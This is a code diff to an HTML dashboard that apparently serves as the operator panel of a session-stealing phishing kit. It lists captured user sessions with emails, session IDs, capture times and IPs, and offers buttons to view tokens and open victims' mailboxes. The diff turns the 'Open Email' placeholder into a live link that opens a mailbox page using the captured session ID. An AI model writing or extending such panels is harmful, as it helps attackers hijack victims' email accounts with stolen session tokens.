@@ -48,7 +48,6 @@
         .loading { text-align: center; padding: 40px; color: #6b7280; }
         .spinner { display: inline-block; width: 20px; height: 20px; border: 2px solid #374151; border-top-color: #3b82f6; border-radius: 50%; animation: spin 0.8s linear infinite; }
         @keyframes spin { to { transform: rotate(360deg); } }
-        .token-preview { font-family: monospace; font-size: 11px; background: #0a0e27; padding: 10px; border-radius: 6px; margin-top: 10px; word-break: break-all; }
     </style>
 </head>
 <body>
@@ -109,7 +108,7 @@
             <h3>📋 User Sessions</h3>
             <button class="tool-btn" id="refreshTableBtn" style="padding: 8px 16px;">🔄 Refresh</button>
         </div>
-         <table>
+        <table>
             <thead>
                 <tr>
                     <th>Email</th>
@@ -122,9 +121,9 @@
                 </tr>
             </thead>
             <tbody id="sessionsTableBody">
-                <tr><td colspan="7" style="text-align: center;">Loading sessions...</td></tr>
+                <tr><td colspan="7" style="text-align: center;">Loading sessions......</td></tr>
             </tbody>
-         </table>
+        </table>
     </div>
 </div>
 
@@ -179,7 +178,7 @@
                 <td><code style="font-size: 11px;">${escapeHtml(session.sid || 'N/A')}</code></td>
                 <td>${formatDate(session.capturedAt)}</td>
                 <td><button class="view-token-btn" onclick="viewToken('${session.sid}')">🔑 View Token</button></td>
-                <td><button class="open-email-btn" onclick="openMailbox('${session.email}', '${session.sid}')">✉️ Open Email</button></td>
+                <td><button class="open-email-btn" onclick="openMailbox('${escapeHtml(session.email)}', '${session.sid}')">✉️ Open Email</button></td>
             </tr>
         `).join('');
     }
@@ -227,7 +226,6 @@
             }
         });
         
-        // IP distribution chart
         const ipCount = {};
         sessions.forEach(session => {
             const ip = session.ip || 'Unknown';
@@ -294,8 +292,7 @@
     }
 
     function openMailbox(email, sid) {
-        alert(`📧 Opening mailbox for: ${email}\n\nFull Outlook Web Access will be implemented in the next phase.`);
-        // window.open(`/mailbox.html?session=${sid}&email=${encodeURIComponent(email)}`, '_blank');
+        window.open(`/mailbox.html?session=${sid}&email=${encodeURIComponent(email)}`, '_blank');
     }
 
     function openAddAccount() {
@@ -340,17 +337,13 @@
         });
     }
 
-    // Event handlers
     document.getElementById('refreshSessionsBtn').onclick = loadSessions;
     document.getElementById('refreshTableBtn').onclick = loadSessions;
     document.getElementById('clearAllSessionsBtn').onclick = clearAllSessions;
     document.getElementById('exportDataBtn').onclick = exportData;
     document.getElementById('addAccountBtn').onclick = openAddAccount;
     
-    // Auto-refresh every 15 seconds
     setInterval(loadSessions, 15000);
-    
-    // Initial load
     loadSessions();
 </script>
 </body>
